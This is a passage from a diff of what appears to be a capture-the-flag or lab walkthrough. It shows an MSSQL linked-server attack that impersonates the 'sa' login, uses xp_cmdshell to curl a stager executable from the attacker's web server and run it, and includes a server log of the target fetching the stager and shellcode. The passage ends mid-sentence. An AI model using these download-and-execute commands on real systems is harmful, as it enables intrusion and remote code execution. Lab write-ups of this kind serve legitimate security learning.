@@ -1197,5 +1197,14 @@ Now i can run the query through xp_cmdshell
 EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell "curl http://10.10.14.61/stager.exe -o C:\Temp\stager.exe && C:\Temp\stager.exe"') AT [PRIMARY];
 ```
 
-This will go to my web server get the stager and save it in the `C:\Temp` directory i made, then execute it 
+This will go to my web server get the stager and save it in the `C:\Temp` directory i made, then execute it, the stager will then run and reach back the webserver again and get the shellcode and load it into memory
+
+```python
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.231.105 - - [29/Aug/2026 18:09:39] "GET /stager.exe HTTP/1.1" 200 -
+10.129.231.105 - - [29/Aug/2026 18:09:46] "GET /http.x64.bin HTTP/1.1" 200 -
+```
+
+This shows the flow of the
 
